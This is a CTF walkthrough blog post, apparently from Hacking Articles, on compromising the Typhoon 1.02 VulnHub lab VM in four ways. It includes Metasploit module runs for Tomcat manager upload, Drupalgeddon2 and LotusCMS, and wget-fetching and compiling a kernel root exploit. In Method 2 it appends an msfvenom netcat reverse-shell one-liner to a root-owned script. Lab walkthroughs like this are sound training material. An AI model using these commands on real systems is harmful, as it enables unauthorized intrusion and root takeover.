@@ -1,0 +1,120 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Typhoon: 1.02 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/typhoon-1-02-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-12-01T02:22:56+00:00">December 1, 2018</time><time class="updated" datetime="2025-06-10T20:11:55+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Typhoon VM contains several vulnerabilities and configuration errors. Typhoon can be used to test vulnerabilities in network services, configuration errors, vulnerable web applications, password cracking attacks, privilege escalation attacks, post exploitation steps, information gathering, and DNS attacks. Prisma training involves the practical use of Typhoon.</span></p>
+<p><span style="color: #000000;">Download it from here: https://www.vulnhub.com/entry/typhoon-102,267/</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Network Scanning (Netdiscover, Nmap)</span></li>
+<li><span style="color: #000000;">1<sup>st</sup> method of exploiting via exploring MongoDB</span></li>
+<li><span style="color: #000000;">Consider robots.txt</span></li>
+<li><span style="color: #000000;">Explore /MongoDB over browser</span></li>
+<li><span style="color: #000000;">Identify credential</span></li>
+<li><span style="color: #000000;">SSH Login</span></li>
+<li><span style="color: #000000;">Find out kernel version</span></li>
+<li><span style="color: #000000;">Kernel privilege escalation</span></li>
+<li><span style="color: #000000;">Obtain root access</span></li>
+<li><span style="color: #000000;">2<sup>nd</sup> method of exploiting via tomcat manager (Metasploit)</span></li>
+<li><span style="color: #000000;">Generating bash payload</span></li>
+<li><span style="color: #000000;">Uploading bash payload</span></li>
+<li><span style="color: #000000;">Obtain root access</span></li>
+<li><span style="color: #000000;">3rd Method: Exploiting Drupal CMS</span></li>
+<li><span style="color: #000000;">4th Method: Exploiting Lotus CMS</span></li>
+</ul>
+<p><span style="color: #000000;">Since there are multiple ways in which we can exploit this machine. Therefore we have used two methods to capture the flag as follows:</span></p>
+<h3><span style="color: #800000;">Method 1:  Exploiting by exploring MongoDB</span></h3>
+<p><span style="color: #000000;"><strong>Let’s Begin with the Walkthrough!!</strong></span></p>
+<p><span style="color: #000000;">Let’s start off with scanning the network to find our targets IP.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-iOud_1Se-ik/XAFiOjDilzI/AAAAAAAAbhM/ugApsz6vKScBDeMDLOaNP5kkNLMGB3SdACEwYBhgL/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">We found our target IP –&gt; <strong>192.168.1.101</strong></span></p>
+<p><span style="color: #000000;">Our next motive is to scan the target IP with nmap.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.101</pre>
+<p><span style="color: #000000;">The NMAP output shows various open ports: 21(ftp), 22(ssh), 25(smtp), 53(domain), 80(http), 110(pop3), 111(rpcbind), 139(netbios-ssn), 143(imap), 445(netbios-ssn), 631(ipp), 993(ssl/imaps), 995(ssl/pop3), 2049(nfs_acl), 3306(mysql), 5432(postgrespl), 8080(http).</span></p>
+<p><span style="color: #000000;">Further, we notice that there is an entry <strong>/monoadmin/</strong> in <strong>robot.txt</strong> as it might be useful.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-_f6QbAyyEYM/XAFiPcxx_BI/AAAAAAAAbhc/iDQJVc29R1ovKEN2ZThVAn3NLxGdSWscwCEwYBhgL/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">We also noticed that <strong>port 8080 is open</strong> for<strong> Apache Tomcat/ Coyote JSP Engine 1.1.</strong> This could be another way of exploiting this machine. But will see to it later on.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_b3TpErbimw/XAFiPhxSQ2I/AAAAAAAAbhk/e-YuUjMj6CQ48Spq9IZpCz02bBmNaUe2gCEwYBhgL/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Moving on, Since port 80 is also open. So, we browsed the found directory <strong>/mongoadmin</strong>/ into the browser. The result displayed is shown in the image. Here we set the change the database to <strong>credentials(84mb).</strong> It will display a link of <strong><u>2 </u></strong>Credentials. Click on it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-u_z3R6KQXRY/XAFiPxA05cI/AAAAAAAAbhg/NgD3Z70SWAsFfL-HfGjBdIXOJDLQMAxPACEwYBhgL/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Clicking on the <strong>2 Credential</strong> link will give us Credentials [username]:typhoon and [password]:789456123 . These credentials might be a great help for further enumeration.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-7jlP5jFkcDw/XAFiQA6oCVI/AAAAAAAAbho/mixONwLbH_YTZ_fQjxHLUMKKiXQ_JrOOQCEwYBhgL/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">After some time, we just strike with an idea <strong>WHY NOT USE THE FOUND CREDS TO LOGIN WITH SSH?. </strong>Since SSH port 22 is also open.</span></p>
+<p><span style="color: #000000;">Then we simply logged in SSH with CREDENTIALS <strong>Username: typhoon &amp; Password: 789456123</strong></span></p>
+<pre class="lang:default decode:true">ssh typhoon@192.168.1.101</pre>
+<p><span style="color: #000000;">Then we checked system information and found out <strong>Ubuntu 14.04</strong> is running on the <strong>target machine</strong>. Good thing we were familiar with an <strong>exploit</strong> for <strong>Ubuntu 14.04</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-l5fxQNKesBg/XAFiQVUAvuI/AAAAAAAAbhs/Hf5pxSyV9dgBsK1nrwNdYwrZbiFA_nkZACEwYBhgL/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Next, we look for an exploit for <strong>ubuntu 14.04</strong> using <strong>searchsploit</strong>. The exploit we have used have highlighted, after that, we have copied the exploit <strong>37292.c</strong> in the <strong>/root/ directory</strong>. Executing a Python server to download the file in the target machine.</span></p>
+<pre class="lang:default decode:true">searchsploit ubuntu 14.04</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-MQIEJ27UQGE/XAFiQ-UoqPI/AAAAAAAAbhw/jQWbF9Gxyfg-4QP0X-5oza5Zvfp87_IzQCEwYBhgL/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Afterward, we have downloaded our exploit <strong>37292.c</strong> in the <strong>/tmp</strong> directory. After compilation and granting permissions to the exploit. We have executed it.</span></p>
+<pre class="lang:default decode:true">cd /tmp
+wget http://192.168.1.109/37292.c
+ls
+gcc 37292.c -o rootshell
+chmod 777 rootshell
+./rootshell
+cd /root
+ls
+cat root-flag</pre>
+<p><span style="color: #000000;"><strong>Booyah!!</strong> We have got the <strong>root access</strong> and found our <strong>FLAG</strong>. We take a look at the content of the file and greeted with a congratulatory message.  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-LCyBqrue5yU/XAFiRFkJaoI/AAAAAAAAbh0/U6URuzUkeV032quZN_Ljieej0myFPp_HACEwYBhgL/s1600/8.png"/></span></p>
+<h3><span style="color: #800000;">Method 2: Exploiting via Tomcat Manager</span></h3>
+<p><span style="color: #000000;">Using Tomcat Manager Upload to get the meterpreter and then further establishing a reverse connection to get root access.</span></p>
+<p><span style="color: #000000;"><strong>Let’s Begin with the Walkthrough!!</strong></span></p>
+<p><span style="color: #000000;">Since in Method-1 port scanning, we notice that <strong>port 8080 is open</strong> for<strong> Apache Tomcat/ Coyote JSP Engine 1.1. </strong>So let’s browse the Target IP on port 8080 on the browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-HyiqZKPrAWw/XAFiRO5OBEI/AAAAAAAAbh4/3EAJ75MCHM4piG6y04e2qRZa8cjYhtW1wCEwYBhgL/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">We are very familiar with <strong>Tomcat Server Login</strong> using <strong>manager web app</strong> due to our previous lab experiences. Without wasting time we straight away logged into <strong>Tomcat Server using Metasploit</strong> <strong>Tomcat Manager</strong> using the Default credentials for Tomcat Server Login.</span></p>
+<pre class="lang:default decode:true">[username]:tomcat
+[password]:tomcat</pre>
+<p><span style="color: #000000;">Oh Yeah! We have got a meterpreter. After spending a lot of time of enumeration, we found a <strong>directory /tab</strong> which consists of file <strong>script.sh</strong> that is owned by root and has FULL Permission. So we thought of inserting malicious code in script.sh.</span></p>
+<pre class="lang:default decode:true  ">use exploit/multi/http/tomcat_mgr_upload
+set rhost 192.168.1.101
+set rport 8080
+set httpusername tomcat
+set httppassword tomcat
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-hJteH9rIkCA/XAFiOmw8UpI/AAAAAAAAbhQ/wAPL6odKGS0tu_r9XXJ2Y5YMPgyFiX9cgCEwYBhgL/s1600/10.png"/></span></p>
+<p><span style="color: #000000;"> Moving on!! We need to create a bash code using Msfvenom:</span></p>
+<pre class="lang:default decode:true">msfvenom –p cmd/unix/reverse_netcat lhost=192.168.1.109 lport=1234 R</pre>
+<p><span style="color: #000000;">After that, append the above generated malicious code in the <strong>script.sh</strong> file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_a9rYSCIG2k/XAFiOZNAE5I/AAAAAAAAbhI/ovvmjawo9qgV3jPAI8hknSCc5fw-JgE1gCEwYBhgL/s1600/11.png"/></span></p>
+<pre class="lang:default decode:true ">echo "mkfifo /tmp/vvwjo; nc 192.168.1.109 1234 0&lt;/tmp/vvwjo | /bin/sh &gt;/tmp/vvwjo 2&gt;&amp;1; rm /tmp/vvwjo" &gt; script.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-3g10xy-mpyo/XAFiPNq6zCI/AAAAAAAAbhU/FiHVUGPMel895LxhFCOcmTjtw70qEgysQCEwYBhgL/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Since the malicious code got executed with the <strong>script.sh</strong> file. Therefore we got a reverse shell on our netcat listener.</span></p>
+<p><span style="color: #000000;"><strong>Yeah!!</strong> We have got the root access and found <strong>root-flag</strong>. We take a look at the content of the file and greeted with a congratulatory message.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-3g10xy-mpyo/XAFiPNq6zCI/AAAAAAAAbhU/FiHVUGPMel895LxhFCOcmTjtw70qEgysQCEwYBhgL/s1600/12.png"/></span></p>
+<h3><span style="color: #800000;">Method 3: Exploiting Drupal CMS</span></h3>
+<p><span style="color: #000000;">Unfortunately, on exploring port 80 we didn’t observe any remarkable things, therefore, we try to enumerate web directory with the help of Dirb tool.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.101</pre>
+<p><img decoding="async" src="https://3.bp.blogspot.com/-VXlqyKPEG2A/XAZ3eZD18EI/AAAAAAAAbl0/hpWG5uV4jDQ3V_NI6S6faPiwTua0WNeQwCLcBGAs/s1600/16.png"/></p>
+<p><span style="color: #000000;">It was wonderful to observe that there was two CMS  as highlighted in the below image.</span></p>
+<p><img decoding="async" src="https://4.bp.blogspot.com/-CF4jr_yAka8/XAZ3eAe6k0I/AAAAAAAAblw/GgIYrfq04tU-dQIZ2Sqgx-7yaUVnhcvkgCLcBGAs/s1600/17.png"/></p>
+<p><span style="color: #000000;">On exploring /Drupal in the web browser, it put up the following web page which was associated with Drupal cms.</span></p>
+<p><span style="color: #000000;">Without wasting time, we chase towards Metasploit and run the following module to exploit Drupal cms.</span></p>
+<pre class="lang:default decode:true">use exploit/unix/webapp/drupal_drupalgeddon2
+msf exploit(/unix/webapp/drupal_drupalgeddon2) &gt; set rhost 192.168.1.101
+msf exploit(/unix/webapp/drupal_drupalgeddon2) &gt; set targeturi /drupal
+msf exploit(/unix/webapp/drupal_drupalgeddon2) &gt; exploit</pre>
+<p><span style="color: #000000;">Booom!! It was a terrific moment to see the meterpreter session of the target machine. Now for the post exploitation, you can follow the above methodology which we have already discussed in the 1<sup>st</sup> method.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-P0OfDtV_XK4/XAZ3dwreUfI/AAAAAAAAbls/fBlyQAZUXIgkjqWmWN7FQd7Nc9x0LKsQACLcBGAs/s1600/18.png"/></p>
+<h3><span style="color: #800000;">Method 4: Exploiting Lotus CMS</span></h3>
+<p><span style="color: #000000;">Scroll up and kindly notice the result which we have obtained from the dirb scan, there we had found two CMS. We had already exploit Drupal, now let’s go for next CMS and try to exploit it, if possible</span></p>
+<p><span style="color: #000000;">So on exploring /cms in the web browser, it put up the following web page which was associated with Lotus cms.</span></p>
+<p><img decoding="async" src="https://4.bp.blogspot.com/-p1kSRUrswv4/XAZ3fMLH9FI/AAAAAAAAbl8/p4vqYAJDWX4LDIz9PXHWXtpQ8OQXmnmHgCLcBGAs/s1600/19.png"/></p>
+<p><span style="color: #000000;">Without wasting must time, again we chase towards Metasploit and run the following module to exploit lotus cms.</span></p>
+<pre class="lang:default decode:true">use exploit/multi/http/lcms_php_exec
+msf exploit(multi/http/lcms_php_exec) &gt; set rhost 192.168.1.101
+msf exploit(multi/http/lcms_php_exec) &gt; set uri /cms/
+msf exploit(multi/http/lcms_php_exec) &gt; exploit</pre>
+<p><img decoding="async" src="https://2.bp.blogspot.com/-_Gkv_cZaIoY/XAZ3e6zU9NI/AAAAAAAAbl4/akYHVJ8YZQUWHoE8Mj4MPEfdf7KwzoB6wCLcBGAs/s1600/20.png"/></p>
+<p><span style="color: #000000;">Great, we have owned another meterpreter session of the target machine. Now for the post-exploitation you can follow the above methodology which we have already discussed in the 1st method.</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing his 2 years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact <strong><u><a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/">Here</a></u></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
